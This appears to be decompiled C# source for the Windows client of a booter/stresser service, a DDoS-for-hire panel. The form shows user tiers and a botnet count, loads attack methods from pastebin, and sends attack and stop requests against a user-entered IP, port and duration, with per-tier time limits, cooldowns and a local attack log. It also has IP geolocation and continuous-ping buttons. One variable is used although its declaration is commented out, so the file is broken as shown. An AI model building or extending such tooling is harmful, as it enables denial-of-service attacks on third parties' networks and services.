﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
//using //LogIn_Theme_Dll_By_xVenoxi;
//using //SafeGuard;

// Token: 0x02000014 RID: 20
public partial class Main : Form
{
	// Token: 0x0600007A RID: 122 RVA: 0x00002401 File Offset: 0x00000601
	public Main()
	{
		this.InitializeComponent();
		this.method_8();
	}

	// Token: 0x0600007B RID: 123 RVA: 0x00002427 File Offset: 0x00000627
	private void method_0(object sender, EventArgs e)
	{
		this.timer_0.Start();
	}

	// Token: 0x0600007C RID: 124 RVA: 0x00004FE8 File Offset: 0x000031E8
	private void Main_Load(object sender, EventArgs e)
	{
		this.timer_2.Start();
		this.timer_3.Start();
		//string request = Tools.getRequest("https://pastebin.com/raw/w73FTnd2");
		string[] dataSource = request.Split(new string[]
		{
			Environment.NewLine
		}, StringSplitOptions.None);
		this.Methods.DataSource = dataSource;
		//Class3.count_0 = DeveloperFunctions.CountCall(Class4.string_0);
		this.username.Text = Class3.loginResponse_0.UserName.ToString();
		this.level.Text = Class3.loginResponse_0.Level.ToString();
		this.totuser.Text = Class3.count_0.UserCount.ToString();
		this.totserver.Text = Class3.count_0.BotnetCount.ToString();
		this.tottoken.Text = Class3.count_0.TokenCount.ToString();
		this.email.Text = Class3.loginResponse_0.Email.ToString();
	}

	// Token: 0x0600007D RID: 125 RVA: 0x00002050 File Offset: 0x00000250
	private void timer_0_Tick(object sender, EventArgs e)
	{
	}

	// Token: 0x0600007E RID: 126 RVA: 0x00002434 File Offset: 0x00000634
	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		this.int_0 = 1;
		this.int_1 = e.X;
		this.int_2 = e.Y;
	}

	// Token: 0x0600007F RID: 127 RVA: 0x00002455 File Offset: 0x00000655
	private void panel1_MouseUp(object sender, MouseEventArgs e)
	{
		this.int_0 = 0;
	}

	// Token: 0x06000080 RID: 128 RVA: 0x000050F0 File Offset: 0x000032F0
	private void panel1_MouseMove(object sender, MouseEventArgs e)
	{
		if (this.int_0 == 1)
		{
			base.SetDesktopLocation(Control.MousePosition.X - this.int_1, Control.MousePosition.Y - this.int_2);
		}
	}

	// Token: 0x06000081 RID: 129 RVA: 0x00002050 File Offset: 0x00000250
	private void method_1(object sender, EventArgs e)
	{
	}

	// Token: 0x06000082 RID: 130 RVA: 0x00002050 File Offset: 0x00000250
	private void method_2(object sender, EventArgs e)
	{
	}

	// Token: 0x06000083 RID: 131 RVA: 0x00002050 File Offset: 0x00000250
	private void method_3(object sender, EventArgs e)
	{
	}

	// Token: 0x06000084 RID: 132 RVA: 0x00005138 File Offset: 0x00003338
	private void button7_Click(object sender, EventArgs e)
	{
		string request = Tools.getRequest("https://pastebin.com/raw/9eCLwUxK");
		MessageBox.Show(request);
	}

	// Token: 0x06000085 RID: 133 RVA: 0x00002050 File Offset: 0x00000250
	private void method_4(object sender, EventArgs e)
	{
	}

	// Token: 0x06000086 RID: 134 RVA: 0x00005158 File Offset: 0x00003358
	private void button1_Click(object sender, EventArgs e)
	{
		if (this.timer_1.Enabled)
		{
			MessageBox.Show("Wait till cooldown is done");
		}
		else
		{
			string text = this.Methods.Text;
			WebClient webClient = new WebClient();
			if (webClient.DownloadString("https://pastebin.com/raw/TyWaxxcC").Contains(text))
			{
				int num = 1000001;
				try
				{
					num = int.Parse(this.timeTB.Text);
				}
				catch
				{
					MessageBox.Show("Time Input Must Be A Number");
					return;
				}
				if (num > 300)
				{
					MessageBox.Show("Time Must Be Lower Than 300 Seconds", "Bypass Method");
					Environment.Exit(0);
				}
			}
			int num2;
			switch (Class3.loginResponse_0.Level)
			{
			case 1:
				num2 = 400;
				goto IL_122;
			case 2:
				num2 = 900;
				goto IL_122;
			case 3:
				num2 = 1000;
				goto IL_122;
			case 4:
				num2 = 1100;
				goto IL_122;
			case 5:
				num2 = 1200;
				goto IL_122;
			case 6:
				num2 = 1500;
				goto IL_122;
			case 7:
				num2 = 1800;
				goto IL_122;
			case 11:
				num2 = 3600;
				goto IL_122;
			}
			num2 = 9;
			IL_122:
			int num3 = 1000001;
			try
			{
				num3 = int.Parse(this.timeTB.Text);
			}
			catch
			{
				MessageBox.Show("Time Input Must Be A Number");
				return;
			}
			if (num3 > num2)
			{
				MessageBox.Show("Time Must Be Lower Than Max Seconds");
				Environment.Exit(0);
			}
			string text2 = this.ipTB.Text;
			WebClient webClient2 = new WebClient();
			if (webClient2.DownloadString("https://pastebin.com/raw/TP8Jmnzu").Contains(text2))
			{
				MessageBox.Show("The IP/URL " + this.ipTB.Text + " Has been Blacklisted", "Warning!");
			}
			else
			{
				this.History.Items.Add("Attack Sent On " + this.ipTB.Text + ":" + this.portTB.Text);
				ClientFunctions.AttackRequest(Class3.loginResponse_0.UserName, Class3.string_0, Class4.string_0, this.ipTB.Text, this.portTB.Text, this.Methods.Text, this.timeTB.Text, false);
				this.timer_1.Start();
				File.AppendAllText(this.string_1, string.Concat(new string[]
				{
					DateTime.Now.ToString(),
					" | [",
					this.Methods.Text,
					"]:",
					this.ipTB.Text,
					":",
					this.portTB.Text,
					" ",
					this.timeTB.Text,
					Environment.NewLine
				}));
			}
		}
	}

	// Token: 0x06000087 RID: 135 RVA: 0x00002050 File Offset: 0x00000250
	private void method_5(object sender, LinkLabelLinkClickedEventArgs e)
	{
	}

	// Token: 0x06000088 RID: 136 RVA: 0x0000544C File Offset: 0x0000364C
	private void button6_Click(object sender, EventArgs e)
	{
		if (this.ipTB.Text == "0.0.0.0")
		{
			MessageBox.Show("Please Enter a valid IP");
		}
		else
		{
			string arguments = "/c ping -t " + this.ipTB.Text;
			Process.Start("CMD.exe", arguments);
		}
	}

	// Token: 0x06000089 RID: 137 RVA: 0x00002050 File Offset: 0x00000250
	private void method_6(object sender, EventArgs e)
	{
	}

	// Token: 0x0600008A RID: 138 RVA: 0x00002050 File Offset: 0x00000250
	private void username_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600008B RID: 139 RVA: 0x0000245E File Offset: 0x0000065E
	private void button5_Click(object sender, EventArgs e)
	{
		new Logs().ShowDialog();
	}

	// Token: 0x0600008C RID: 140 RVA: 0x000054A0 File Offset: 0x000036A0
	private void button3_Click(object sender, EventArgs e)
	{
		WebClient webClient = new WebClient();
		string text = webClient.DownloadString("http://ip-api.com/line/" + this.ipTB.Text);
		MessageBox.Show(this, text);
	}

	// Token: 0x0600008D RID: 141 RVA: 0x000054D8 File Offset: 0x000036D8
	private void timer_1_Tick(object sender, EventArgs e)
	{
		int maximum;
		switch (Class3.loginResponse_0.Level)
		{
		case 1:
			maximum = 100;
			goto IL_6C;
		case 2:
			maximum = 100;
			goto IL_6C;
		case 3:
			maximum = 95;
			goto IL_6C;
		case 4:
			maximum = 95;
			goto IL_6C;
		case 5:
			maximum = 80;
			goto IL_6C;
		case 6:
			maximum = 75;
			goto IL_6C;
		case 7:
			maximum = 60;
			goto IL_6C;
		case 11:
			maximum = 5;
			goto IL_6C;
		}
		maximum = 5;
		IL_6C:
		this.progressBar1.Maximum = maximum;
		if (this.progressBar1.Value < this.progressBar1.Maximum)
		{
			this.progressBar1.Value = this.progressBar1.Value + 1;
		}
		if (this.progressBar1.Value == this.progressBar1.Maximum)
		{
			this.timer_1.Stop();
			this.History.Items.Add("CoolDown Finished!");
			this.progressBar1.Value = this.progressBar1.Maximum;
			this.progressBar1.Value = 0;
		}
	}

	// Token: 0x0600008E RID: 142 RVA: 0x00002050 File Offset: 0x00000250
	private void progressBar1_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600008F RID: 143 RVA: 0x0000246B File Offset: 0x0000066B
	private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		this.History.Items.Clear();
	}

	// Token: 0x06000090 RID: 144 RVA: 0x00002050 File Offset: 0x00000250
	private void method_7(object sender, EventArgs e)
	{
	}

	// Token: 0x06000091 RID: 145 RVA: 0x000055EC File Offset: 0x000037EC
	private void label6_Click(object sender, EventArgs e)
	{
		if (this.timer_1.Enabled)
		{
			MessageBox.Show("Wait for cooldown to finish.");
		}
		else
		{
			Environment.Exit(0);
		}
	}

	// Token: 0x06000092 RID: 146 RVA: 0x0000247D File Offset: 0x0000067D
	private void label7_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	// Token: 0x06000093 RID: 147 RVA: 0x00002050 File Offset: 0x00000250
	private void listBox2_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	// Token: 0x06000094 RID: 148 RVA: 0x0000561C File Offset: 0x0000381C
	private void button2_Click(object sender, EventArgs e)
	{
		this.History.Items.Add("Attack Stopped on " + this.ipTB.Text);
		ClientFunctions.AttackRequest(Class3.loginResponse_0.UserName, Class3.string_0, Class4.string_0, this.ipTB.Text, this.portTB.Text, "STOP", this.timeTB.Text, false);
	}

	// Token: 0x06000095 RID: 149 RVA: 0x00002486 File Offset: 0x00000686
	private void pictureBox3_Click(object sender, EventArgs e)
	{
		MessageBox.Show("hbh(ovuy) and ungv(your_offline)", "Xbox");
	}

	// Token: 0x06000096 RID: 150 RVA: 0x00005690 File Offset: 0x00003890
	private void timer_2_Tick(object sender, EventArgs e)
	{
		Random random = new Random();
		int alpha = random.Next(0, 255);
		int red = random.Next(0, 255);
		int green = random.Next(0, 255);
		int blue = random.Next(0, 255);
		this.button4.ForeColor = Color.FromArgb(alpha, red, green, blue);
	}

	// Token: 0x06000097 RID: 151 RVA: 0x000056F0 File Offset: 0x000038F0
	private void button4_Click(object sender, EventArgs e)
	{
		if (Class3.loginResponse_0.Level < 11)
		{
			MessageBox.Show("Sorry your not a admin");
		}
		else
		{
			MessageBox.Show("Coming Soon.");
		}
	}

	// Token: 0x06000098 RID: 152 RVA: 0x00005728 File Offset: 0x00003928
	private void timer_3_Tick(object sender, EventArgs e)
	{
		Random random = new Random();
		int alpha = random.Next(0, 255);
		int red = random.Next(0, 255);
		int green = random.Next(0, 255);
		int blue = random.Next(0, 255);
		this.Methods.LineColour = Color.FromArgb(alpha, red, green, blue);
	}

	// Token: 0x06000099 RID: 153 RVA: 0x00002498 File Offset: 0x00000698
	private void pictureBox2_Click(object sender, EventArgs e)
	{
		Process.Start("https://instagram/ovuyz");
		Process.Start("https://instagram/your_offline");
	}

	// Token: 0x0600009A RID: 154 RVA: 0x00005788 File Offset: 0x00003988
	public void method_8()
	{
		if (Main.string_0 != new WebClient().DownloadString("https://pastebin.com/raw/CVWdqrgu"))
		{
			this.updatePictureBox.Visible = true;
			this.timer_0.Start();
		}
	}

	// Token: 0x0600009B RID: 155 RVA: 0x000024B0 File Offset: 0x000006B0
	private void updatePictureBox_Click(object sender, EventArgs e)
	{
		Process.Start("https://pastebin.com/iHgDhLCR");
		Environment.Exit(0);
	}

	// Token: 0x0600009C RID: 156 RVA: 0x000024C3 File Offset: 0x000006C3
	private void pictureBox1_Click(object sender, EventArgs e)
	{
		MessageBox.Show("ovuy'#7006");
	}

	// Token: 0x0600009D RID: 157 RVA: 0x000057C8 File Offset: 0x000039C8
	protected virtual void Dispose(bool disposing)
	{
		if (disposing && this.icontainer_0 != null)
		{
			this.icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	// Token: 0x0400005F RID: 95
	public static string string_0 = "2.3";

	// Token: 0x04000060 RID: 96
	private int int_0;

	// Token: 0x04000061 RID: 97
	private int int_1;

	// Token: 0x04000062 RID: 98
	private int int_2;

	// Token: 0x04000063 RID: 99
	private string string_1 = "C:\\ProgramData\\synicityservices\\AttackInfo.json";

    private void totuser_Click(object sender, EventArgs e)
    {

    }

    private void groupBox3_Enter(object sender, EventArgs e)
    {

    }

    private void label11_Click(object sender, EventArgs e)
    {

    }

    private void label5_Click(object sender, EventArgs e)
    {

    }

    private void level_Click(object sender, EventArgs e)
    {

    }
}
